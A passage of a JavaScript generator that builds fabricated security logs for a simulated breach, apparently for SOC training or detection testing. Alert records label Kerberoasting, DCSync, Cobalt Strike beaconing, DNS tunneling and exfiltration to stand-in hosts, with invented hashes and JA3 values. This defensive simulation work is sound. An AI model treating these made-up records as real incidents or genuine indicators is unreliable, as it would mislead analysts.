    { flow:'SN-2042', name:'Kerberoasting - SPN Ticket Request', type:'Credential_Theft', sev:'high', conf:89, score:85, src:'ws-finance-21', dst:'dc-primary-01', dport:88, proto:'TCP', app:'Kerberos', pkts:8, bytes:2048, mins:82, mitre:'T1558.003', c2:'no', beacon:'no', lat:'yes', exfil:'no', scan:'no' },
    { flow:'SN-2043', name:'LDAP Reconnaissance - AD Enumeration', type:'Reconnaissance', sev:'high', conf:87, score:79, src:'ops-jump-55', dst:'dc-primary-01', dport:389, proto:'TCP', app:'LDAP', pkts:68, bytes:51200, mins:50, mitre:'T1087.002', c2:'no', beacon:'no', lat:'yes', exfil:'no', scan:'no' },
    { flow:'SN-2044', name:'Suspicious SMB File Access', type:'Lateral_Movement', sev:'high', conf:91, score:84, src:'ops-jump-55', dst:'fs-payroll-01', dport:445, proto:'TCP', app:'SMB', pkts:128, bytes:102400, mins:55, mitre:'T1021.002', c2:'no', beacon:'no', lat:'yes', exfil:'no', scan:'no' },
    { flow:'SN-2045', name:'DCSync Attack - DRSUAPI GetNCChanges', type:'Credential_Theft', sev:'critical', conf:97, score:96, src:'ops-jump-55', dst:'dc-primary-01', dport:135, proto:'TCP', app:'MSRPC', pkts:22, bytes:16384, mins:75, mitre:'T1003.006', c2:'no', beacon:'no', lat:'yes', exfil:'no', scan:'no' },
    { flow:'SN-2046', name:'DCSync - Bulk Directory Replication', type:'Credential_Theft', sev:'critical', conf:98, score:97, src:'ops-jump-55', dst:'dc-secondary-02', dport:389, proto:'TCP', app:'LDAP', pkts:256, bytes:204800, mins:77, mitre:'T1003.006', c2:'no', beacon:'no', lat:'yes', exfil:'no', scan:'no' },
    { flow:'SN-2047', name:'Remote Execution via DCOM', type:'Execution', sev:'high', conf:88, score:86, src:'ops-jump-55', dst:'ws-finance-21', dport:135, proto:'TCP', app:'MSRPC', pkts:22, bytes:16384, mins:65, mitre:'T1021.003', c2:'no', beacon:'no', lat:'yes', exfil:'no', scan:'no' },
    { flow:'SN-2048', name:'xp_cmdshell Database Execution', type:'Execution', sev:'high', conf:93, score:87, src:'ws-finance-21', dst:'db-finance-03', dport:1433, proto:'TCP', app:'MSSQL', pkts:6, bytes:4096, mins:88, mitre:'T1059', c2:'no', beacon:'no', lat:'yes', exfil:'no', scan:'no' },
    { flow:'SN-2049', name:'File Staging - Archive Creation', type:'Collection', sev:'high', conf:86, score:82, src:'ops-jump-55', dst:'fs-payroll-01', dport:445, proto:'TCP', app:'SMB', pkts:2560, bytes:2097152, mins:96, mitre:'T1074.001', c2:'no', beacon:'no', lat:'no', exfil:'yes', scan:'no' },
    { flow:'SN-2050', name:'SNMP Community String Enumeration', type:'Reconnaissance', sev:'medium', conf:78, score:62, src:'ws-finance-21', dst:'rtr-core-01', dport:161, proto:'UDP', app:'SNMP', pkts:6, bytes:512, mins:95, mitre:'T1082', c2:'no', beacon:'no', lat:'no', exfil:'no', scan:'yes' },
  ];
  lateralAlerts.forEach(a => {
    const sh = HOSTS[a.src]; const dh = HOSTS[a.dst];
    push([a.flow, a.name, a.type, a.sev, a.conf, a.score,
      ts(BASE, a.mins), ts(BASE, a.mins, 60),
      sh.ip, rand(52100, 65000), sh.mac, a.src, sh.country,
      dh.ip, a.dport, dh.mac, a.dst, dh.country,
      a.proto, a.app, a.pkts, a.bytes,
      '', '', '', '', '', '', '',
      '', '', '', '', '',
      '', '', '', 'no', '',
      a.c2, a.beacon, a.lat, a.exfil, a.scan,
      USERS[a.src] || 'svc-ops@corp.local', 'success',
      a.score - rand(2, 5), 37.7749, -122.4194, a.mitre,
      `Arista NDR: ${a.name} ${a.src}->${a.dst}:${a.dport} [MITRE ${a.mitre}]`
    ]);
  });

  // TLS / JA3 anomaly
  {
    const sh = HOSTS['ws-finance-21']; const dh = EXT.c2_server;
    push(['SN-2051', 'Suspicious TLS Fingerprint - Known Malware JA3', 'Command_and_Control', 'critical', 96, 94,
      ts(BASE, 130), ts(BASE, 130, 30),
      sh.ip, 54300, sh.mac, 'ws-finance-21', sh.country,
      dh.ip, 443, dh.mac, dh.hostname, dh.country,
      'TCP', 'HTTPS', 5, 1280,
      '', '', 'GET', 'c2-infra-196-45', '/beacon', '200', 'Mozilla/5.0 (compatible; MSIE 9.0)',
      'TLS 1.2', 'TLS_RSA_WITH_AES_128_CBC_SHA', 'cd8693b5f1e43c5d0fcfbf1a8b9c2d3e', '4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b', 'c2-infra-196-45',
      '', '', '', 'yes', 'CobaltStrike',
      'yes', 'yes', 'no', 'no', 'no',
      'jdavis@corp.local', '',
      94, 50.4501, 30.5234, 'T1071.001',
      `CRITICAL: CobaltStrike JA3 fingerprint match ws-finance-21->${dh.ip}:443 [${dh.country}] [MITRE T1071.001]`
    ]);
  }

  // Exfiltration alerts
  const exfilAlerts = [
    { score: 91, bytes: 1048576, mins: 100, ua: 'python-requests/2.31.0', uri: '/api/v1/upload?batch=1' },
    { score: 93, bytes: 2097152, mins: 105, ua: 'python-requests/2.31.0', uri: '/api/v1/upload?batch=2' },
    { score: 96, bytes: 4194304, mins: 112, ua: 'python-requests/2.31.0', uri: '/api/v1/batch?compress=1' },
  ];
  exfilAlerts.forEach((e, i) => {
    const sh = HOSTS['ws-finance-21']; const dh = EXT.exfil_target;
    push([`SN-20${55+i}`, 'Data Exfiltration - Large Upload to External', 'Exfiltration', 'critical', 95, e.score,
      ts(BASE, e.mins), ts(BASE, e.mins, 120),
      sh.ip, rand(54400, 65000), sh.mac, 'ws-finance-21', sh.country,
      dh.ip, 443, dh.mac, dh.hostname, dh.country,
      'TCP', 'HTTPS', Math.round(e.bytes / 1024), e.bytes,
      '', '', 'POST', 'upload.bucket-store.io', e.uri, '200', e.ua,
      'TLS 1.3', 'TLS_AES_256_GCM_SHA384', '771,4865-4866-4867,0-23-65281', '', 'upload.bucket-store.io',
      'dump.zip', 'a3f5c1d2e7b8f9a0c1d2e3f4a5b6c7d8', 'c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2', 'no', '',
      'no', 'no', 'no', 'yes', 'no',
      'jdavis@corp.local', '',
      e.score - rand(2, 4), EXT.exfil_target.lat, EXT.exfil_target.lon, 'T1041',
      `CRITICAL: Data Exfiltration ${sh.ip}->${dh.ip}:443 ${(e.bytes/1048576).toFixed(1)}MB [MITRE T1041]`
    ]);
  });

  // C2 beaconing alerts
  for (let i = 0; i < 12; i++) {
    const sh = HOSTS['ws-finance-21']; const dh = EXT.c2_server;
    push([`SN-20${60+i}`, 'C2 Beacon - Periodic Check-in Detected', 'Command_and_Control', 'critical', 97, 90 + (i % 8),
      ts(BASE, 130 + i * 5, rand(0, 15)), ts(BASE, 130 + i * 5, rand(16, 30)),
      sh.ip, rand(54500, 65000), sh.mac, 'ws-finance-21', sh.country,
      dh.ip, 443, dh.mac, dh.hostname, dh.country,
      'TCP', 'HTTPS', rand(3, 8), rand(512, 2048),
      '', '', 'GET', 'c2-infra-196-45', '/beacon', '200', 'Mozilla/5.0 (compatible; MSIE 9.0)',
      'TLS 1.2', 'TLS_RSA_WITH_AES_128_CBC_SHA', 'cd8693b5f1e43c5d0fcfbf1a8b9c2d3e', '4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b', 'c2-infra-196-45',
      '', '', '', 'yes', 'CobaltStrike',
      'yes', 'yes', 'no', 'no', 'no',
      'jdavis@corp.local', '',
      90 + i, 50.4501, 30.5234, 'T1071.001',
      `C2-BEACON[${i+1}]: ws-finance-21->${dh.ip}:443 interval=300s beacon=${i+1} [CobaltStrike]`
    ]);
  }

  // DNS tunneling
  {
    const sh = HOSTS['ws-finance-21']; const dh = HOSTS['dc-primary-01'];
    push(['SN-2073', 'DNS Tunneling Detected', 'Command_and_Control', 'high', 88, 84,
      ts(BASE, 118), ts(BASE, 122),
      sh.ip, rand(1024, 65535), sh.mac, 'ws-finance-21', sh.country,
      dh.ip, 53, dh.mac, 'dc-primary-01', dh.country,
      'UDP', 'DNS', 128, 12288,
      'a3f5c1d2.exfil-data-a.c2-domain.io.', '0.0.0.0', '', '', '', '', '',
      '', '', '', '', '',
      '', '', '', 'yes', '',
      'yes', 'no', 'no', 'yes', 'no',
      'jdavis@corp.local', '',
      82, 37.7749, -122.4194, 'T1071.004',
      `DNS Tunneling: ${sh.ip}->DC:53 high-entropy subdomain queries c2-domain.io [MITRE T1071.004]`
    ]);
  }

  // AS-REP Roasting
  {
    const sh = HOSTS['ws-finance-21']; const dh = HOSTS['dc-primary-01'];
    push(['SN-2074', 'AS-REP Roasting - Pre-Authentication Disabled', 'Credential_Theft', 'high', 91, 83,
      ts(BASE, 84), ts(BASE, 84, 20),
      sh.ip, rand(54000, 65000), sh.mac, 'ws-finance-21', sh.country,
      dh.ip, 88, dh.mac, 'dc-primary-01', dh.country,
      'TCP', 'Kerberos', 6, 1536,
      '', '', '', '', '', '', '',
      '', '', '', '', '',
      '', '', '', 'no', '',
      'no', 'no', 'yes', 'no', 'no',
      'jdavis@corp.local', '',
      81, 37.7749, -122.4194, 'T1558.004',
      `AS-REP Roasting: ws-finance-21->dc-primary-01:88 requesting pre-auth disabled accounts [MITRE T1558.004]`
    ]);
  }

  // WinRM
  {
    const sh = HOSTS['ws-finance-21']; const dh = HOSTS['dc-primary-01'];
    push(['SN-2075', 'WinRM Remote Session - Compromised Host', 'Lateral_Movement', 'high', 87, 81,
      ts(BASE, 80), ts(BASE, 80, 300),
      sh.ip, rand(54000, 65000), sh.mac, 'ws-finance-21', sh.country,
      dh.ip, 5985, dh.mac, 'dc-primary-01', dh.country,
      'TCP', 'WinRM', 22, 16384,
      '', '', '', '', '', '', '',
      '', '', '', '', '',
      '', '', '', 'no', '',
      'no', 'no', 'yes', 'no', 'no',
      'jdavis@corp.local', 'success',
      79, 37.7749, -122.4194, 'T1021.006',
      `WinRM: ws-finance-21->dc-primary-01:5985 lateral movement [MITRE T1021.006]`
    ]);
  }

  // Telnet
  {
    const sh = HOSTS['ws-finance-21']; const dh = HOSTS['sw-dist-01'];
    push(['SN-2076', 'Telnet Access to Network Device', 'Discovery', 'medium', 82, 64,
      ts(BASE, 97), ts(BASE, 99),
      sh.ip, rand(49500, 65000), sh.mac, 'ws-finance-21', sh.country,
      dh.ip, 23, dh.mac, 'sw-dist-01', dh.country,
      'TCP', 'Telnet', 12, 1024,
      '', '', '', '', '', '', '',
      '', '', '', '', '',
      '', '', '', 'no', '',
      'no', 'no', 'no', 'no', 'yes',
      'jdavis@corp.local', '',
      62, 37.7749, -122.4194, 'T1082',
      `Telnet: ws-finance-21->sw-dist-01:23 network device access from compromised endpoint`
    ]);
  }

  return [headers.join(','), ...rows].join('\n');
}

// ── Cisco ISE ──────────────────────────────────────────────────────────────────
function generateISE() {
  const headers = [
    'timestamp','event_id','event_name','category','severity',
    'username','src_ip','src_port','dst_ip','dst_port','nas_ip',
    'mac_address','hostname','os_type','device_type','identity_group',
    'auth_protocol','failure_reason','risk_score','src_country',
    'session_id','framed_ip','policy_set','auth_rule','posture_status',
    'endpoint_profile','vlan_assignment','nas_port_type','nas_port_id',
    'audit_session_id'
  ];

  const rows = [];
  let iseId = 5200001;
  const push = (fields) => { rows.push(row(fields)); };

  const iseUsers = [
    { user: 'jdavis@corp.local', host: 'ws-finance-21', os: 'Windows 11', group: 'Domain Users', profile: 'Windows-Workstation', posture: 'compliant' },
    { user: 'mchen@corp.local',  host: 'ws-finance-22', os: 'Windows 11', group: 'Domain Users', profile: 'Windows-Workstation', posture: 'compliant' },
    { user: 'tpatel@corp.local', host: 'ws-finance-23', os: 'Windows 10', group: 'Domain Users', profile: 'Windows-Workstation', posture: 'compliant' },
    { user: 'kreyes@corp.local', host: 'ws-finance-24', os: 'Windows 11', group: 'Domain Users', profile: 'Windows-Workstation', posture: 'compliant' },
    { user: 'bwong@corp.local',  host: 'ws-finance-25', os: 'Windows 10', group: 'Domain Users', profile: 'Windows-Workstation', posture: 'compliant' },
    { user: 'scode@corp.local',  host: 'ws-hr-31',      os: 'Windows 11', group: 'Domain Users', profile: 'Windows-Workstation', posture: 'compliant' },
    { user: 'lmartinez@corp.local', host: 'ws-hr-32',   os: 'Windows 10', group: 'Domain Users', profile: 'Windows-Workstation', posture: 'compliant' },
    { user: 'roshea@corp.local', host: 'eng-ws-44',     os: 'Ubuntu 22.04', group: 'Engineering', profile: 'Linux-Workstation', posture: 'compliant' },
    { user: 'amurphy@corp.local',host: 'eng-ws-45',     os: 'Ubuntu 22.04', group: 'Engineering', profile: 'Linux-Workstation', posture: 'compliant' },
    { user: 'nkumar@corp.local', host: 'eng-ws-46',     os: 'macOS 14', group: 'Engineering', profile: 'Apple-Mac', posture: 'compliant' },
  ];

  let nasToggle = 0;
  const nasHosts = ['ise-nad-01', 'ise-nad-02'];

  // Morning auth events
  iseUsers.forEach((u, i) => {
    const h = HOSTS[u.host];
    const nasHost = nasHosts[nasToggle++ % 2];
    const nas = HOSTS[nasHost];
    const nasPort = rand(49200, 49299);
    const sesId = `ISE-SES-${pad(i+1, 4)}`;
    const auditId = `0a0a50${pad(i+1, 2)}00000000${pad(rand(1000, 9999), 4)}`;
    const vlan = h.vlan;

    // Successful auth
    push([ts(BASE, i * 4), `ISE-${iseId++}`, '5200 Authentication succeeded', 'Authentication', 'notice',
      u.user, h.ip, nasPort, nas.ip, 1812, nas.ip,
      h.mac, u.host, u.os, h.type, u.group,
      'EAP-TLS', '', rand(3, 12), h.country,
      sesId, h.ip, 'Corp-Dot1x', 'Allow-All-Corp', u.posture,
      u.profile, vlan, 'Ethernet', `GigabitEthernet1/0/${i+1}`,
      auditId
    ]);
  });

  // Periodic re-auth
  iseUsers.slice(0, 5).forEach((u, i) => {
    const h = HOSTS[u.host];
    const nasHost = nasHosts[i % 2];
    const nas = HOSTS[nasHost];
    push([ts(BASE, 60 + i * 10), `ISE-${iseId++}`, '5201 Authentication succeeded (re-auth)', 'Authentication', 'notice',
      u.user, h.ip, rand(49300, 49399), nas.ip, 1812, nas.ip,
      h.mac, u.host, u.os, h.type, u.group,
      'EAP-TLS', '', rand(2, 8), h.country,
      `ISE-SES-${pad(i+11, 4)}`, h.ip, 'Corp-Dot1x', 'Allow-All-Corp', u.posture,
      u.profile, h.vlan, 'Ethernet', `GigabitEthernet1/0/${i+1}`,
      `0a0a50${pad(i+11, 2)}00000000${pad(rand(1000, 9999), 4)}`
    ]);
  });

  // Auth failures - suspicious
  const failEvents = [
    { user: 'svc-ops@corp.local',    host: 'ops-jump-55', mins: 40, reason: '24408 Client certificate was not found in identity store', sev: 'warning', risk: 68 },
    { user: 'administrator',          host: 'ops-jump-55', mins: 42, reason: '22040 Wrong password or invalid shared secret', sev: 'warning', risk: 72 },
    { user: 'svc-sql@corp.local',     host: 'db-finance-03', mins: 62, reason: '24408 Client certificate was not found in identity store', sev: 'warning', risk: 70 },
    { user: 'jdavis@corp.local',      host: 'ws-finance-21', mins: 80, reason: '22056 Subject not found in the applicable identity store(s)', sev: 'error', risk: 78 },
    { user: 'svc-backup@corp.local',  host: 'fs-payroll-01', mins: 92, reason: '15039 Selected Authorization Profile is DenyAccess', sev: 'error', risk: 80 },
    { user: 'Administrator',          host: 'ops-jump-55', mins: 95, reason: '22040 Wrong password or invalid shared secret', sev: 'warning', risk: 75 },
    { user: 'jdavis@corp.local',      host: 'ws-finance-21', mins: 100, reason: '15039 Selected Authorization Profile is DenyAccess', sev: 'error', risk: 82 },
  ];
  failEvents.forEach(f => {
    const h = HOSTS[f.host] || {};
    const nas = HOSTS['ise-nad-01'];
    push([ts(BASE, f.mins), `ISE-${iseId++}`, '5400 Authentication failed', 'Authentication', f.sev,
      f.user, h.ip || '10.10.40.55', rand(49400, 49499), nas.ip, 1812, nas.ip,
      h.mac || '00:50:56:00:00:00', f.host, h.os || 'Unknown', h.type || 'Workstation', 'Domain Users',
      'PEAP-MSCHAPv2', f.reason, f.risk, h.country || 'US',
      `ISE-SES-FAIL-${pad(iseId, 4)}`, h.ip || '', 'Corp-Dot1x', 'Deny-Access', 'unknown',
      'Unknown', 0, 'Ethernet', 'GigabitEthernet1/0/48',
      `0a0a50FF000000${pad(iseId, 4)}`
    ]);
  });

  // Posture failures
  push([ts(BASE, 45), `ISE-${iseId++}`, '80002 Posture Assessment Failed', 'Posture', 'warning',
    'roshea@corp.local', HOSTS['eng-ws-44'].ip, 49500, HOSTS['ise-nad-01'].ip, 1812, HOSTS['ise-nad-01'].ip,
    HOSTS['eng-ws-44'].mac, 'eng-ws-44', 'Ubuntu 22.04', 'Workstation', 'Engineering',
    'EAP-TLS', 'Antivirus definitions out of date', 55, 'US',
    'ISE-SES-POST-001', HOSTS['eng-ws-44'].ip, 'Corp-Dot1x', 'Quarantine', 'non-compliant',
    'Linux-Workstation', 90, 'Wireless', 'Wlan0',
    '0a0a50AA0000000001'
  ]);

  push([ts(BASE, 48), `ISE-${iseId++}`, '80002 Posture Assessment Failed', 'Posture', 'warning',
    'lab.user1@corp.local', HOSTS['lab-host-61'].ip, 49501, HOSTS['ise-nad-02'].ip, 1812, HOSTS['ise-nad-02'].ip,
    HOSTS['lab-host-61'].mac, 'lab-host-61', 'Ubuntu 22.04', 'Workstation', 'Lab Users',
    'EAP-TLS', 'OS patch level below minimum requirement', 52, 'US',
    'ISE-SES-POST-002', HOSTS['lab-host-61'].ip, 'Lab-Policy', 'Quarantine', 'non-compliant',
    'Linux-Workstation', 50, 'Wireless', 'Wlan0',
    '0a0a50BB0000000002'
  ]);

  // NAD RADIUS accounting
  push([ts(BASE, 1), `ISE-${iseId++}`, '3000 Radius Accounting Start', 'Accounting', 'info',
    'jdavis@corp.local', HOSTS['ws-finance-21'].ip, 49600, HOSTS['ise-nad-01'].ip, 1813, HOSTS['ise-nad-01'].ip,
    HOSTS['ws-finance-21'].mac, 'ws-finance-21', 'Windows 11', 'Workstation', 'Domain Users',
    '', '', rand(3, 10), 'US',
    'ISE-SES-ACC-001', HOSTS['ws-finance-21'].ip, 'Corp-Dot1x', 'Allow-All-Corp', 'compliant',
    'Windows-Workstation', 10, 'Ethernet', 'GigabitEthernet1/0/1',
    '0a0a50010000000001'
  ]);

  push([ts(BASE, 125), `ISE-${iseId++}`, '3001 Radius Accounting Stop', 'Accounting', 'info',
    'jdavis@corp.local', HOSTS['ws-finance-21'].ip, 49600, HOSTS['ise-nad-01'].ip, 1813, HOSTS['ise-nad-01'].ip,
    HOSTS['ws-finance-21'].mac, 'ws-finance-21', 'Windows 11', 'Workstation', 'Domain Users',
    '', '', rand(3, 10), 'US',
    'ISE-SES-ACC-001', HOSTS['ws-finance-21'].ip, 'Corp-Dot1x', 'Allow-All-Corp', 'compliant',
    'Windows-Workstation', 10, 'Ethernet', 'GigabitEthernet1/0/1',
    '0a0a50010000000001'
  ]);

  // Guest auth
  push([ts(BASE, 25), `ISE-${iseId++}`, '5200 Authentication succeeded', 'Authentication', 'notice',
    'guest-visitor-001', '10.10.50.80', 55001, HOSTS['ise-nad-02'].ip, 1812, HOSTS['ise-nad-02'].ip,
    'EE:FF:00:11:22:33', 'BYOD-guest-80', 'Android 13', 'Mobile', 'Guest',
    'PEAP-MSCHAPv2', '', 20, 'US',
    'ISE-SES-GUEST-001', '10.10.50.80', 'Guest-Policy', 'Guest-Redirect', 'unknown',
    'Android-Device', 50, 'Wireless', 'Wlan0',
    '0a0a50GG0000000001'
  ]);

  // 5405 RADIUS packet dropped
  push([ts(BASE, 33), `ISE-${iseId++}`, '5405 RADIUS Request dropped', 'Authentication', 'warning',
    '', EXT.attacker_nl.ip, 49700, HOSTS['ise-nad-01'].ip, 1812, HOSTS['ise-nad-01'].ip,
    EXT.attacker_nl.mac, EXT.attacker_nl.hostname, 'Unknown', 'Unknown', 'Unknown',
    'PAP/ASCII', 'Received request from unknown NAS', 80, EXT.attacker_nl.country,
    '', '', '', '', 'unknown',
    'Unknown', 0, 'Unknown', '',
    ''
  ]);

  return [headers.join(','), ...rows].join('\n');
}

// ── Cisco DNA Centre ────────────────────────────────────────────────────────────
function generateDNAC() {
  const headers = [
    'timestamp','event_id','event_name','category','severity',
    'src_ip','src_port','dst_ip','dst_port','src_hostname','dst_hostname',
    'device_name','site','issue_type','bytes','packets','protocol',
    'risk_score','username','vlan','ssid','ap_name','latency_ms',
    'alert_name','client_health','network_health','band','rssi_dbm',
    'channel','client_onboard_time_ms','auth_type','device_os'
  ];

  const rows = [];
  let dId = 1;
  const push = (fields) => { rows.push(row([`DNAC-${pad(dId++, 4)}`, ...fields])); };

  const sites = ['Campus-A/Building-1/Floor-1', 'Campus-A/Building-1/Floor-2', 'Campus-B/Building-2/Floor-1', 'DataCenter-1'];
  const apNames = ['AP-B1-F1-01', 'AP-B1-F1-02', 'AP-B1-F2-01', 'AP-B2-F1-01', 'AP-DC-01'];
  const ssids = ['CorpSSID', 'LabSSID', 'GuestSSID'];

  // Client onboard events
  const clientOnboards = [
    { src: 'ws-finance-21', dst: 'app-erp-04',   dport: 8443, bytes: 18900, pkts: 22, proto: 'HTTPS', user: 'jdavis@corp.local',  mins: 2,  health: 85, band: '5GHz', rssi: -55, ch: 36  },
    { src: 'ws-finance-22', dst: 'fs-payroll-01', dport: 445,  bytes: 6144,  pkts: 8,  proto: 'SMB',   user: 'mchen@corp.local',   mins: 4,  health: 88, band: '5GHz', rssi: -58, ch: 40  },
    { src: 'ws-finance-23', dst: 'db-finance-03', dport: 1433, bytes: 4096,  pkts: 6,  proto: 'MSSQL', user: 'tpatel@corp.local',  mins: 6,  health: 82, band: '5GHz', rssi: -62, ch: 44  },
    { src: 'ws-hr-31',      dst: 'app-crm-05',   dport: 443,  bytes: 12288, pkts: 16, proto: 'HTTPS', user: 'scode@corp.local',   mins: 8,  health: 91, band: '5GHz', rssi: -52, ch: 36  },
    { src: 'eng-ws-44',     dst: 'app-erp-04',   dport: 8443, bytes: 20480, pkts: 26, proto: 'HTTPS', user: 'roshea@corp.local',  mins: 10, health: 79, band: '2.4GHz', rssi: -68, ch: 6 },
    { src: 'lab-host-61',   dst: 'app-erp-04',   dport: 80,   bytes: 4800,  pkts: 8,  proto: 'HTTP',  user: 'lab.user1@corp.local', mins: 12, health: 76, band: '2.4GHz', rssi: -70, ch: 11 },
    { src: 'lab-host-62',   dst: 'dc-primary-01',dport: 88,   bytes: 1024,  pkts: 4,  proto: 'Kerberos',user:'lab.user2@corp.local', mins:14, health:80, band:'5GHz', rssi:-60, ch:36 },
    { src: 'ws-finance-24', dst: 'app-erp-04',   dport: 8443, bytes: 15360, pkts: 20, proto: 'HTTPS', user: 'kreyes@corp.local',  mins: 16, health: 87, band: '5GHz', rssi: -56, ch: 44  },
    { src: 'ws-hr-32',      dst: 'app-crm-05',   dport: 443,  bytes: 9216,  pkts: 12, proto: 'HTTPS', user: 'lmartinez@corp.local',mins:18, health:84, band:'5GHz', rssi:-59, ch:40  },
    { src: 'eng-ws-45',     dst: 'app-erp-04',   dport: 8443, bytes: 22528, pkts: 28, proto: 'HTTPS', user: 'amurphy@corp.local', mins: 20, health: 78, band: '2.4GHz', rssi: -66, ch: 1 },
  ];

  clientOnboards.forEach((c, i) => {
    const sh = HOSTS[c.src]; const dh = HOSTS[c.dst];
    const si = sites[i % (sites.length - 1)];
    const ap = apNames[i % apNames.length];
    const ssid = c.src.includes('lab') ? 'LabSSID' : 'CorpSSID';
    push([ts(BASE, c.mins), 'Client-Onboard-Success', 'ClientAssurance', 'info',
      sh.ip, rand(54001, 55000), dh.ip, c.dport, c.src, c.dst,
      `sw-dist-0${(i%2)+1}`, si, 'ClientOnboarding', c.bytes, c.pkts, c.proto,
      rand(5, 15), c.user, sh.vlan, ssid, ap, rand(8, 30),
      '', c.health, rand(75, 95), c.band, c.rssi, c.ch, rand(200, 800), 'EAP-TLS', sh.os
    ]);
  });

  // Client roaming events
  const roamEvents = [
    { src: 'ws-finance-21', mins: 30, band: '5GHz', rssi: -61, ch: 48, health: 80 },
    { src: 'ws-finance-22', mins: 35, band: '5GHz', rssi: -65, ch: 44, health: 77 },
    { src: 'lab-host-61',   mins: 40, band: '2.4GHz', rssi: -72, ch: 6, health: 70 },
  ];
  roamEvents.forEach((r, i) => {
    const sh = HOSTS[r.src];
    push([ts(BASE, r.mins), 'Client-Roam-Event', 'ClientAssurance', 'info',
      sh.ip, rand(54100, 55100), sh.ip, 0, r.src, '',
      `sw-dist-0${(i%2)+1}`, sites[i%2], 'ClientRoaming', 0, 0, '',
      rand(3, 10), USERS[r.src] || '', sh.vlan, 'CorpSSID', apNames[(i+1) % apNames.length], rand(15, 45),
      '', r.health, rand(70, 90), r.band, r.rssi, r.ch, 0, 'EAP-TLS', sh.os
    ]);
  });

  // Network health events
  push([ts(BASE, 22), 'Network-Health-Issue', 'NetworkHealth', 'warning',
    '10.10.70.1', 0, '', 0, 'sw-dist-01', '',
    'sw-dist-01', 'Campus-A/Building-1', 'CPUHighUtilization', 0, 0, '',
    38, '', 70, '', '', 0,
    'Switch CPU Utilization Above 80%', 0, 62, '', 0, 0, 0, '', 'IOS-XE 17.9'
  ]);

  push([ts(BASE, 38), 'Network-Health-Issue', 'NetworkHealth', 'warning',
    '10.10.70.2', 0, '', 0, 'sw-dist-02', '',
    'sw-dist-02', 'Campus-B/Building-2', 'InterfaceErrorRate', 0, 0, '',
    35, '', 70, '', '', 0,
    'Interface Error Rate Exceeds Threshold', 0, 65, '', 0, 0, 0, '', 'IOS-XE 17.9'
  ]);

  push([ts(BASE, 55), 'AP-Coverage-Hole', 'RFManagement', 'warning',
    '10.10.70.1', 0, '', 0, 'sw-dist-01', '',
    'sw-dist-01', 'Campus-A/Building-1/Floor-2', 'CoverageHole', 0, 0, '',
    25, '', 50, 'CorpSSID', 'AP-B1-F2-01', 0,
    'RF Coverage Hole Detected', 0, 78, '5GHz', 0, 0, 0, '', ''
  ]);

  // App performance
  push([ts(BASE, 28), 'Application-Latency-High', 'ApplicationExperience', 'warning',
    HOSTS['ws-finance-21'].ip, rand(54000, 65000), HOSTS['app-erp-04'].ip, 8443, 'ws-finance-21', 'app-erp-04',
    'sw-dist-01', sites[0], 'HighAppLatency', 32768, 40, 'HTTPS',
    28, USERS['ws-finance-21'], HOSTS['ws-finance-21'].vlan, 'CorpSSID', apNames[0], 380,
    'ERP Application Latency Above SLA (>200ms)', 82, 80, '5GHz', -56, 36, 0, 'EAP-TLS', HOSTS['ws-finance-21'].os
  ]);

  push([ts(BASE, 45), 'Application-Latency-High', 'ApplicationExperience', 'warning',
    HOSTS['eng-ws-44'].ip, rand(54000, 65000), HOSTS['app-erp-04'].ip, 8443, 'eng-ws-44', 'app-erp-04',
    'sw-dist-01', sites[0], 'HighAppLatency', 16384, 22, 'HTTPS',
    22, USERS['eng-ws-44'], HOSTS['eng-ws-44'].vlan, 'CorpSSID', apNames[0], 420,
    'ERP Application Latency Above SLA (>200ms)', 76, 80, '2.4GHz', -68, 6, 0, 'EAP-TLS', HOSTS['eng-ws-44'].os
  ]);

  // Security advisory
  push([ts(BASE, 50), 'Security-Advisory-Detected', 'SecurityAdvisory', 'high',
    HOSTS['sw-dist-01'].ip, 0, '', 0, 'sw-dist-01', '',
    'sw-dist-01', 'Campus-A', 'CVE-2023-20198', 0, 0, '',
    75, '', 70, '', '', 0,
    'IOS-XE CVE-2023-20198 Web UI Vulnerability Detected', 0, 65, '', 0, 0, 0, '', 'IOS-XE 17.9'
  ]);

  push([ts(BASE, 52), 'Security-Advisory-Detected', 'SecurityAdvisory', 'critical',
    HOSTS['rtr-core-01'].ip, 0, '', 0, 'rtr-core-01', '',
    'rtr-core-01', 'DataCenter-1', 'CVE-2023-20109', 0, 0, '',
    82, '', 70, '', '', 0,
    'IOS-XR CVE-2023-20109 MPLS Label Stack Vulnerability', 0, 58, '', 0, 0, 0, '', 'IOS-XR 7.9'
  ]);

  // Client exclusion (anomaly after compromise)
  push([ts(BASE, 105), 'Client-Excluded', 'ClientAssurance', 'high',
    HOSTS['ws-finance-21'].ip, 0, '', 0, 'ws-finance-21', '',
    'sw-dist-01', sites[0], 'ClientExclusion', 0, 0, '',
    85, USERS['ws-finance-21'], HOSTS['ws-finance-21'].vlan, 'CorpSSID', apNames[0], 0,
    'Client Excluded - Repeated Auth Failure / Policy Violation', 0, 80, '5GHz', -55, 36, 0, 'EAP-TLS', HOSTS['ws-finance-21'].os
  ]);

  push([ts(BASE, 108), 'Anomalous-Traffic-Pattern', 'ClientAssurance', 'high',
    HOSTS['ws-finance-21'].ip, rand(54000, 65000), EXT.exfil_target.ip, 443, 'ws-finance-21', EXT.exfil_target.hostname,
    'sw-dist-01', sites[0], 'AnomalousTrafficVolume', 4194304, 5120, 'HTTPS',
    90, USERS['ws-finance-21'], HOSTS['ws-finance-21'].vlan, 'CorpSSID', apNames[0], rand(80, 200),
    'Anomalous High-Volume Upload - Possible Data Exfiltration', 40, 80, '5GHz', -55, 36, 0, 'EAP-TLS', HOSTS['ws-finance-21'].os
  ]);

  // Additional normal flows
  const extraFlows = [
    { src: 'ws-finance-25', dst: 'db-finance-03', dport: 1433, bytes: 8192, pkts: 12, proto: 'MSSQL', user: 'bwong@corp.local', mins: 22, health: 83 },
    { src: 'eng-ws-46',     dst: 'app-erp-04',   dport: 8443, bytes: 16384, pkts: 20, proto: 'HTTPS', user: 'nkumar@corp.local', mins: 24, health: 81 },
    { src: 'ws-hr-31',      dst: 'dc-primary-01',dport: 88,   bytes: 1024,  pkts: 4,  proto: 'Kerberos',user:'scode@corp.local',mins:26,health:86 },
    { src: 'lab-host-61',   dst: 'app-erp-04',   dport: 8080, bytes: 6144,  pkts: 8,  proto: 'HTTP',  user: 'lab.user1@corp.local', mins: 32, health: 75 },
